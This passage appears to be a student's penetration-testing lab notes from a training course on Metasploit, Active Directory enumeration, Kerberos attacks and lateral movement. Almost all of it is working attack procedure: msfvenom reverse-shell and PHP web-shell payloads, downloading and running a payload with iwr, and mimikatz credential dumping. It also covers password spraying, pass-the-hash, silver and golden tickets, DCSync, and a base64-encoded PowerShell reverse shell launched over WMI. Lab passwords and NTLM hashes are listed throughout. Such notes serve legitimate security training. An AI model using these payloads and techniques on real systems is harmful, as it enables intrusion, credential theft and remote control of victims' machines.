    `ssh kali@192.168.164.7 pass:7he_C4t_c0ntro11er`
    `kali@felineauthority:~$ dnscat2-server feline.corp`
  - move to PGDATABASE01 to run the dnscat2 client binary > Session established!  
    ```
    database_admin@pgdatabase01:~$ cd dnscat/
    database_admin@pgdatabase01:~/dnscat$ ./dnscat feline.corp
    ``` 
  - Interacting with the dnscat2 client from the server FELINEAUTHORITY  
    ```
    dnscat2> windows
    dnscat2> window -i 1
    ```   
  - Setting up a port forward from FELINEAUTHORITY to PGDATABASE01 (listening on 4647 on the loopback interface of FELINEAUTHORITY, and forwarding to 4646 on HRSHARES)  
    `command (pgdatabase01) 1> listen 0.0.0.0:4647 172.16.164.217:4646`
  - Connect to FELINEAUTHORITY via port forward 4647  
    `./dnscat_exercise_client -i 192.168.164.7 -p 4647`

### The metasploit framework  
- **setup and work with MSF - nmap**  
  ```
  msf6 > db_nmap -A 192.168.231.202
  msf6 > hosts
  msf6 > services
  msf6 > services -p 8000
  ```
- **Auxiliary modules - Brute force SSH**
  - nmap -sV 192.168.231.16 > port 20, 2222  
  - search ssh auxiliary modules > 16 auxiliary/scanner/ssh/ssh_login
    `msf6 > search type:auxiliary ssh` `msf6 > use 16`
  - configure options and execute "ssh_login" module > George:chocolate
    ```
    msf6 auxiliary(scanner/ssh/ssh_login) > options
    set PASS_FILE /usr/share/wordlists/rockyou.txt
    set USERNAME george
    set RHOSTS 192.168.231.201
    set RPORT 2222
    run    
    ```
  - ssh to VM1
    `ssh -p 2222 george@192.168.231.201`
- **exploit module Apache 2.4.49**
  - nmap -sV 192.168.231.16 > port 22,80 (Apache httpd 2.4.49)  
  - search Apache 2.4.49 modules > 0 exploit/multi/http/apache_normalize_path_rce  
    `msf6 > search Apache 2.4.49`  
  - set payload of the exploit module
    ```
    msf6 exploit(multi/http/apache_normalize_path_rce) > show options
    msf6 exploit(multi/http/apache_normalize_path_rce) > set payload linux/x64/meterpreter/reverse_tcp
    msf6 exploit(multi/http/apache_normalize_path_rce) > set SSL false
    msf6 exploit(multi/http/apache_normalize_path_rce) > set LHOST 192.168.45.182
    msf6 exploit(multi/http/apache_normalize_path_rce) > set RPORT 80
    msf6 exploit(multi/http/apache_normalize_path_rce) > set RHOSTS 192.168.231.16
    msf6 exploit(multi/http/apache_normalize_path_rce) > run

    meterpreter > pwd
    ```
  - **exploit staged payload/linux/x64/shell/reverse_tcp**
    ```
    show payloads > 18: payload/linux/x64/shell/reverse_tcp
    set payload 18 
    run
    ```
  - **exploit payload/linux/x64/meterpreter_reverse_https**
    ```
    msf6 exploit(multi/http/apache_normalize_path_rce) > set payload payload/linux/x64/meterpreter_reverse_https
    msf6 exploit(multi/http/apache_normalize_path_rce) > set SSL false
    msf6 exploit(multi/http/apache_normalize_path_rce) > run 
    run

    meterpreter > help
    meterpreter > search -f 'passwords'
    meterpreter > cat /opt/passwords
    ```
  - **use msfvenom to create a windows staged TCP reverse shell and start a multi/handler**
    - Listing a Windows executable with a reverse shell payload
      `kali@kali:~$ msfvenom -l payloads --platform windows --arch x64`
    - Creating a Windows executable with a staged TCP reverse shell payload  
      `kali@kali:~$ msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.45.182 LPORT=443 -f exe -o staged.exe`
    - use Metasploit's multi/handler to handle staged, non-staged interactive command prompt
      ```
      msf6 > use multi/handler
      msf6 exploit(multi/handler) > set payload windows/x64/shell/reverse_tcp
      msf6 exploit(multi/handler) > set LHOST 192.168.45.182
      msf6 exploit(multi/handler) > set LPORT 443
      msf6 exploit(multi/handler) > run
      ```
  - Use msfvenom to create a .pHP web shell (bind or reverse shell) and upload to VM2 to obtain an interactive shell
    - nmap -sV 192.168.231.189 > port 80, 135, 139, 445, 5985, 8000
    - enumerate web application directories > http://192.168.231.189/meteor/
      `gobuster dir -u http://192.168.231.189/ -w /usr/share/wfuzz/wordlist/general/megabeast.txt`
    - test upload files > "File 44976.py has been uploaded in the uploads directory!"  
    - list the payloads for php >  php/reverse_php
      `msfvenom -l payloads | grep php`
    - Use msfvenom to create a .pHP web shell (bind or reverse shell)
      `msfvenom -p php/reverse_php LHOST=192.168.45.182 LPORT=443 -f raw > shell.pHP`
    - Trigger the Shell
      `curl http://192.168.231.189/meteor/uploads/shell.pHP`
    - start a listener (before trigger) and interact
      ```
      └─$ nc -nlvp 443
      listening on [any] 443 ...
      connect to [192.168.45.182] from (UNKNOWN) [192.168.231.189] 63519
      whoami
      ```
- **migrate the process to OneDrive.exe**
  - nmap -sV 192.168.231.189 > port 135, 139, 445, 3389, 44444
  - generate windows meterpreter reverse shell payload
    ```
    msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.45.179 LPORT=443 -f exe -o met.exe
    sudo mv met.exe /var/www/html/
    ```
  - setup meterpreter listener
    ```
    msfconsole
    msf6 > use multi/handler
    msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_https
    msf6 exploit(multi/handler) > set LPORT 443
    msf6 exploit(multi/handler) > set LHOST 192.168.45.179
    msf6 exploit(multi/handler) > run
    ```
 - connect to the bind shell on port 4444 on ITWK01,download and execute met.exe
   ```
   kali@kali:~$ nc 192.168.231.223 4444
   C:\Users\luiza>powershell
   PS C:\Users\luiza> iwr -uri http://192.168.45.179/met.exe -Outfile met.exe
   PS C:\Users\luiza> .\met.exe
   ```
 - change the timeout seconds
   ```
   meterpreter > background
   msf6 exploit(multi/handler) > sessions
   msf6 exploit(multi/handler) > sessions -i 3 --timeout 30
   msf6 exploit(multi/handler) > sessions -i 3
   meterpreter > set_timeouts -x 30 -t 3
   ```
 - get flag
   ```
   meterpreter > getsystem  //elevate our privileges
   meterpreter > getuid
   meterpreter > ps
   meterpreter > migrate -N explorer.exe
   meterpreter > getenv Flag
   ```
- **Use kiwi to retrieve the NTLM hash**
  ```
  msf6 exploit(multi/handler) > use exploit/windows/local/bypassuac_sdclt
  msf6 exploit(windows/local/bypassuac_sdclt) > show options
  msf6 exploit(windows/local/bypassuac_sdclt) > set LHOST 192.168.45.179
  msf6 exploit(windows/local/bypassuac_sdclt) > set SESSION 4
  msf6 exploit(windows/local/bypassuac_sdclt) > sessions -i 4

  meterpreter > getsystem
  meterpreter > load kiwi
  meterpreter > help
  meterpreter > creds_msv
  ```
- **UAC bypass**
  ```
  msf6 exploit(multi/handler) > use exploit/windows/local/bypassuac_sdclt
  msf6 exploit(windows/local/bypassuac_sdclt) > show options
  msf6 exploit(windows/local/bypassuac_sdclt) > set SESSION 9
  msf6 exploit(windows/local/bypassuac_sdclt) > set 192.168.45.179
  msf6 exploit(windows/local/bypassuac_sdclt) > run

  meterpreter > shell
  C:\Windows\system32> powershell -ep bypass
  PS C:\Windows\system32> Import-Module NtObjectManager
  PS C:\Windows\system32> Get-NtTokenIntegrityLevel
  ```
- **Search for a post-exploitation module that enumerates the Windows Hosts file**
  ```
  msf6 exploit(windows/local/bypassuac_sdclt) > search hostfile
  msf6 exploit(windows/local/bypassuac_sdclt) > use post/windows/gather/enum_hostfile
  msf6 post(windows/gather/enum_hostfile) > set SESSION 6
  ```
- **pivot with metasploit**
  - `PS C:\Users\luiza> ipconfig`
  - Add route and scan for SMB, RDP port
    ```
    msf6 exploit(multi/handler) > route add 172.16.186.0/24 1
    msf6 exploit(multi/handler) > route print

    msf6 exploit(multi/handler) > use auxiliary/scanner/portscan/tcp
    msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 172.16.186.200 
    msf6 auxiliary(scanner/portscan/tcp) > set PORTS 445, 3389
    msf6 auxiliary(scanner/portscan/tcp) > run
    ```
  - authenticate to a remote Windows system over SMB  
    ```
    msf6 auxiliary(scanner/portscan/tcp) > use exploit/windows/smb/psexec
    msf6 exploit(windows/smb/psexec) > set SMBUser luiza
    msf6 exploit(windows/smb/psexec) > set SMBPass "BoccieDearAeroMeow1!"
    msf6 exploit(windows/smb/psexec) > set RHOSTS 172.16.186.200
    msf6 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/bind_tcp
    msf6 exploit(windows/smb/psexec) > set LPORT 8000
    msf6 exploit(windows/smb/psexec) > run
    ```
  - add port forward via meterpreter  
    `meterpreter > portfwd add -l 3389 -p 3389 -r 172.16.186.200`
  - RDP  
    `xfreerdp3 /u:luiza /p:BoccieDearAeroMeow1! /v:127.0.0.1 /cert:ignore /drive:share,/home/kali/share`
- **use a resource script to set up a multi/handler**
  - create listener.rc
    ```
    use exploit/multi/handler
    set PAYLOAD windows/meterpreter_reverse_https
    set LHOST 192.168.45.179
    set LPORT 443
    set AutoRunScript post/windows/manage/migrate 
    set ExitOnSession false
    run -z -j
    ```
  - execute msfconsole module  
    `kali@kali:~$ sudo msfconsole -r listener.rc`
  - trigger the payload
    ```
    xfreerdp3 /u:justin /p:SuperS3cure1337# /v:192.168.231.202 /cert:ignore /drive:share,/home/kali/share
    PS C:\Users\justin> iwr -uri http://192.168.45.179/met.exe -Outfile met.exe
    PS C:\Users\justin> .\met.exe
    ```
- capstone (apache_nifi and SMB psexec)  
  - Enumeration  
    VM1: `nmap -sV 192.168.231.225`: port 135, 139, 445, 8080 (http-Jetty 9.4.48)  
    VM2: `nmap -sV 192.168.231.226`: port 135, 139, 445  
    `whatweb http://192.168.231.225:8080` > Title[NiFi]
  - search exploit module in msfconsole  
    ```
    msf6 > search Jetty
    msf6 > search nifi

    msf6 > search type:auxiliary smb
    msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.231.225
    msf6 auxiliary(scanner/smb/smb_version) > run
    msf6 auxiliary(scanner/smb/smb_version) > vulns
    ...
    SMB Sign in is not required
    ```
  - Execute exploit  
    ```
    msf6 >  use multi/http/apache_nifi_processor_rce
    msf6 exploit(multi/http/apache_nifi_processor_rce) > show advanced
    msf6 exploit(multi/http/apache_nifi_processor_rce) > set RHOSTS 192.168.231.225
    msf6 exploit(multi/http/apache_nifi_processor_rce) > set LHOST 192.168.45.179
    msf6 exploit(multi/http/apache_nifi_processor_rce) > set TARGET 1
    msf6 exploit(multi/http/apache_nifi_processor_rce) > set payload cmd/windows/powershell/x64/meterpreter/reverse_tcp
    msf6 exploit(multi/http/apache_nifi_processor_rce) > set SSL false
    msf6 exploit(multi/http/apache_nifi_processor_rce) > set ForceExploit true
    msf6 exploit(multi/http/apache_nifi_processor_rce) > run
    ```
  - Enumerate target OS/User info after meterpreter session (VM1)  
    ```
    meterpreter > sysinfo
    meterpreter > getuid  //ITWK03\alex
    meterpreter > getprivs //SeImpersonatePrivilege
    meterpreter > getsystem
    meterpreter > shell
    C:\nifi-1.17.0> net user  //Administrator, itwk04admin
    ```
  - Dump credentials  
    `meterpreter > hashdump` //itwk04admin:1003:aad3b435b51404eeaad3b435b51404ee:**445414c16b5689513d4ad8234391aacf**:::
  - pass the hash (SMB accept NTLM hash as credential) to connect to VM2  
    ```
    msf6 exploit(windows/smb/psexec) > set SMBUser itwk04admin
    msf6 exploit(windows/smb/psexec) > set SMBPass 00000000000000000000000000000000:445414c16b5689513d4ad8234391aacf
    msf6 exploit(windows/smb/psexec) > set RHOSTS 192.168.231.226
    msf6 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/bind_tcp
    msf6 exploit(windows/smb/psexec) > set LPORT 8000
    msf6 exploit(windows/smb/psexec) > run

    OR
    impacket-psexec -hashes 00000000000000000000000000000000:445414c16b5689513d4ad8234391aacf itwk04admin@192.168.159.22
    ```
  - Capture the flag  
    `meterpreter > shell` `C:\Windows\system32>type C:\Users\itwk04admin\Desktop\flag.txt`  

### Active Directory Introduction and Enumeration  
- Legacy Window Tools
  - Which user is a member of the Management Department group?  
    `xfreerdp3 /u:stephanie /p:'LegmanTeamBenzoin!!' /d:corp.com /v:192.168.231.75 /cert:ignore /drive:share,/home/kali/share`
    `net group "Management Department" /domain`
- PowerShell and .NET Classes
  - LDAP path
    ```
    PS C:\Users\stephanie> powershell -ep bypass
    
	notepad enumeration.ps1
	$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
	$DN = ([adsi]'').distinguishedName 
	$LDAP = "LDAP://$PDC/$DN"
	$LDAP

    PS C:\Users\stephanie> .\enumeration.ps1
    ```
- Seach functionality in script
  - numerate the domain groups “Service Personnel”， then enumerate the attributes for the last direct user member
    ```
    notepad .\function.ps1
	function LDAPSearch {
	    param (
	        [string]$LDAPQuery
	    )
	
	    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
	    $DistinguishedName = ([adsi]'').distinguishedName
	
	    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")
	
	    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)
	
	    return $DirectorySearcher.FindAll()
	}

	PS C:\Users\stephanie> powershell -ep bypass
    PS C:\Users\stephanie> Import-Module .\function.ps1

    PS C:\Users\stephanie> $group = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Service Personnel*))"
    PS C:\Users\stephanie> $group.properties.member

    PS C:\Users\stephanie\Desktop> $group = LDAPSearch -LDAPQuery "(&(objectCategory=user)(cn=michelle*))"
    PS C:\Users\stephanie\Desktop> $group.properties
    ```
- PowerView
  - `Import-Module .\PowerView.ps1`  
  - List domain groups  
    `Get-NetGroup`
  - Which new user is a part of the Domain Admins group?  
    ```
    Get-NetUser | select cn,whencreated
    Get-NetGroup "Domain Admins" | select member
    ```
- Enumerating OS
  - `powershell -ep bypass`  
  - `Import-Module .\PowerView.ps1`  
  - What is the DistinguishedName for the WEB04 machine > CN=web04,CN=Computers,DC=corp,DC=com
    `Get-NetComputer -Name WEB04 | select distinguishedname`  
  - What is the exact operating system version for FILES04 > 10.0 (20348)
    `Get-NetComputer -Name FILES04 | select operatingsystem, operatingsystemversion`  
    `Get-NetComputer | select name, operatingsystem, operatingsystemversion`   
- Getting overview of permissions and logged on users
  - Find out which new machine has administrative privileges  
    `Find-LocalAdminAccess`
    `xfreerdp3 /u:stephanie /p:'LegmanTeamBenzoin!!' /d:corp.com /v:192.168.154.72 /cert:ignore /drive:share,/home/kali/share`  
- capstones (Misconfigured GenericAll access)
  - Find ACL misconfigurations (GenericAll-can reset password without knowing old one)/ Bloodhount > robert  
    `Find-InterestingDomainAcl | select identityreferencename,activedirectoryrights,acetype,objectdn | ?{$_.IdentityReferenceName -NotContains "DnsAdmins"} | ft`
  - Reset Robert’s password  
    `Set-DomainUserPassword -Identity robert -AccountPassword (ConvertTo-SecureString 'NewP@ssw0rd!' -AsPlainText -Force)`
  - check robert's privilege (Use PowerView to see where Robert is local admin) > client74  
    `Find-LocalAdminAccess -Credential (New-Object System.Management.Automation.PSCredential("CORP\robert",(ConvertTo-SecureString 'NewP@ssw0rd!' -AsPlainText -Force)))`  
  - RDP to client74  
    `xfreerdp3 /u:robert /p:'NewP@ssw0rd!' /d:corp.com /v:192.168.154.74 /cert:ignore /drive:share,/home/kali/share`

### Attacking active drectiory authentication
- `xfreerdp3 /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.158.75 /cert:ignore /drive:share,/home/kali/share`
- `xfreerdp3 /u:jeffadmin /d:corp.com /p:BrouhahaTungPerorateBroom2023! /v:192.168.158.70 /cert:ignore /drive:share,/home/kali/share`
- powershell -ep bypass  
- Import-Module .\PowerView.ps1  

- password attacks
  - view policy  
    `net accounts`
  - Spray the credentials of pete against all domain joined machines with crackmapexec, which machine is pete a local administrator  
    ```
    Get-NetComputer | select CN, operatingsystem
    crackmapexec smb 192.168.188.70-192.168.188.76 -u pete -p 'Nexus123!' -d corp.com --continue-on-success
    ```
- AS-REP Roasting
  - Find Vulnerable Users Does not require Kerberos preauthentication > dave  
    `kali@kali:~$ Get-DomainUser -PreauthNotRequired | Select-Object samaccountname`
  - Request AS-REP  
    `kali@kali:~$ impacket-GetNPUsers -dc-ip 192.168.188.70  -request -outputfile hashes.asreproast corp.com/pete`
  - crack the hash  
    `kali@kali:~$ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
- Kerberoasting
  - Use Rubeus to enumerate all domain user accounts with an SPN (service accounts) and request TGS tickets for them  
    `.\Rubeus.exe kerberoast /outfile:hashes.kerberoast`
  - transfer hashes.kerberoast to kali  
  - crack with hashcat (hash mode: Kerberos 5 TGS-REP)  
    `sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r add1.rule --force`  
  - create custom rule (adds "1" to every password in rockyou.txt)  
    `echo '$1' > add1.rule`  
- Silver tickets
  - Enable Debug Privileges in Mimikatz  
    `mimikatz # privilege::debug`  
  - Dump Logon Passwords (NTLM hash of the iis_service)  
    `mimikatz # sekurlsa::logonpasswords`  
  - Enumerate Domain Users > jeffadmin (can use any domain user)  
    `PS C:\tools> Get-NetUser | select cn, whencreated`  
  - Get Current User SID > S-1-5-21-1987370270-658905905-1781884369  
    `PS C:\Users\jeff> whoami /user`
  - Forge a Silver Ticket  
    `mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin`  
  - Check Injected Tickets (Admin powershell)  
    `PS C:\Tools> klist`  
  - Access Target Service with Forged Ticket  
    `PS C:\Tools> (iwr -UseDefaultCredentials http://web04).Content | findstr /i "OS{"`
- Domain controller synchronization
  - perform the dcsync attack to obtain the NTLM hash of the krbtgt account  
    ```
    PS C:\Users\jeffadmin> cd C:\Tools\
    PS C:\Tools> .\mimikatz.exe
    mimikatz # lsadump::dcsync /user:corp\krbtgt
    kali@kali:~$ hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
    ```
- capstone access to DC1 (AS-REP roasting 'mike' + password spray (client75 admin) + mimikatz for maria)
  - Find Vulnerable Users Does not require Kerberos preauthentication on DC  
    `impacket-GetNPUsers -dc-ip 192.168.158.70  -request -outputfile hashes.asreproast corp.com/pete` (Not working) OR  
    `impacket-GetNPUsers -dc-ip 192.168.158.70 corp.com/pete:Nexus123! -request -outputfile hashes2.asreproast`  
  - Cracking the AS-REP hash with Hashcat > mike:Darkness1099! (Rules: add nothing, 1, or !)  
    ```
    append.rule
    :
    $1
    $!

    sudo hashcat -m 18200 hashes2.asreproast /usr/share/wordlists/rockyou.txt -r append.rule --force
    ```
  - Spray the new credential across all machines using crackmapexec  (mike is admin on client75)  
    `nano users.txt`  `kali@kali:~$ crackmapexec smb 192.168.158.70-192.168.158.75 -u users.txt -p 'Darkness1099!' -d corp.com --continue-on-success`  
  - Login to client75 with Mike user  
    `xfreerdp3 /u:mike /d:corp.com /p:Darkness1099! /v:192.168.158.75 /cert:ignore /drive:share,/home/kali/share`  
  - Use mimikatz to perform post-exploitation and try logging into DC1. > passwordt_1415  
    ```
    mimikatz # privilege::debug
    mimikatz # sekurlsa::logonpasswords
    hashcat -m 1000 maria_hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
    
    xfreerdp3 /u:maria /d:corp.com /p:passwordt_1415 /v:192.168.158.70 /cert:ignore /drive:share,/home/kali/share  OR
    rdesktop -u maria -p passwordt_1415 -d corp.com -g 1280x860 -r disk:share=/home/kali/share 192.168.158.70
    ```
- capstone access to DC1 (AS-REP roasting 'mike' + password spray (meg, backupuser) + admin login)
  - Spray this password "VimForPowerShell123!" against the domain users 'meg' and 'backupuser'  
    `kali@kali:~$ crackmapexec smb 192.168.158.70-192.168.158.75 -u users.txt -p 'VimForPowerShell123!' -d corp.com --continue-on-success`
  - Get SPN  
    `kali@kali:~$ sudo impacket-GetUserSPNs -request -dc-ip 192.168.158.70 corp.com/meg`
  - crack the hash  
    `sudo hashcat -m 13100 meg.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
  - RDP to DC1 as 'backupser'  
    `rdesktop -u backupuser -p DonovanJadeKnight1 -d corp.com -g 1280x860 -r disk:share=/home/kali/share 192.168.158.70`  

### Lateral movement in active directory  
**credentials**
jen:Nexus123!  
jeff:Nexus123! (admin)  
jeffadmin:BrouhahaTungPerorateBroom2023! (DC1)
dave: (privilege on web04)  
offsec:lab (admin)  

**RDP**  
`xfreerdp3 /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.158.75 /cert:ignore /drive:share,/home/kali/share`  
`xfreerdp3 /u:offsec /p:lab /v:192.168.158.74 /cert:ignore /drive:share,/home/kali/share`  (local admin without 'd')  
`rdesktop -u backupuser -p DonovanJadeKnight1 -d corp.com -g 1280x860 -r disk:share=/home/kali/share 192.168.158.70`  

**PowerView.ps1 (admin PS)**  
`PS C:\Tools> powershell -ep bypass`  
`PS C:\Tools> Import-Module .\PowerView.ps1'  
'PS C:\Tools> Get-NetUser | select cn`  

**mimikatz.exe (admin PS)**  
`mimikatz # privilege::debug`  
`mimikatz # sekurlsa::tickets` //lists kereros tickets in memory  

**obtain hash**  
`mimikatz # sekurlsa::logonpasswords`  //Dumps cleartext passwords, NTLM hashes, and Kerberos tickets  
`mimikatz # lsadump::sam` //Dumps local SAM database hashes (requires SYSTEM)  
`mimikatz # lsadump::lsa /patch`  //Dumps cached domain credentials (Administrator, krbtgt, etc)  

**Hashcat - crack the hash**   
`kali@kali:~$ hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`  //descync  
`kali@kali:~$ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`  //AS-REP  
`kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force` //Kerberoasting from .\Rubeus.exe  

**Attack**  
`mimikatz # sekurlsa::pth /user:USERNAME /domain:DOMAIN /ntlm:NTLMHASH /run:cmd.exe`  //Pass-the-Hash  
`mimikatz # kerberos::golden /user:USERNAME /domain:DOMAIN /sid:<domain SID> /krbtgt:<krbtgt hash> /id:500 /ptt`  //golden-ticket  
`mimikatz # lsadump::dcsync /domain:corp.com /user:<Administrator/krbtgt>` //Requests replication from a DC, extracts NTLM hashes directly without dumping ntds.dit  

**lateral movement**  
`PS C:\Tools\SysinternalsSuite> .\PsExec64.exe -i  \\web04 -u corp\jen -p Nexus123! cmd` //normal user to standalone machine web04  
`PS C:\tools\SysinternalsSuite> .\PsExec.exe \\web04 cmd` //normal user to standalone machine web04  
`kali@kali:~$ /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.127.72`  //admin user to standalone machine web04  

- WMI and WinRM
  - **jeff**:client74 --> web04
    `xfreerdp3 /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.158.74 /cert:ignore /drive:share,/home/kali/share`  
  - create encode payload.py in kali
    nano encode.py  //kali IP 
    ```
    import sys
    import base64

    payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.223",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName  System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte =  ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' 

    cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
    print(cmd)

    output>
    powershell -nop -w hidden -e  JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMgAzACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
    ```
  - create netcat listener 443 in kali
  - Executing the WMI payload with base64 reverse shell in target user's PowerShell
    ```
    PS C:\Users\jeff> $username = 'jen';
    PS C:\Users\jeff> $password = 'Nexus123!';
    PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
    PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

    PS C:\Users\jeff> $Options = New-CimSessionOption -Protocol DCOM
    PS C:\Users\jeff> $Session = New-Cimsession -ComputerName 192.168.158.72 -Credential $credential -SessionOption $Options   //target IP of web04

    PS C:\Users\jeff> $Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMgAzACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=';

    PS C:\Users\jeff> Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
    ```
  - Successfully triggered a reverse shell from the victim 192.168.158.72 to your Kali 192.168.45.223
    ```
    └─$ nc -lvnp 443
    listening on [any] 443 ...
    connect to [192.168.45.223] from (UNKNOWN) [192.168.158.72] 56987
    hostname
    web04
    PS C:\Windows\system32> 
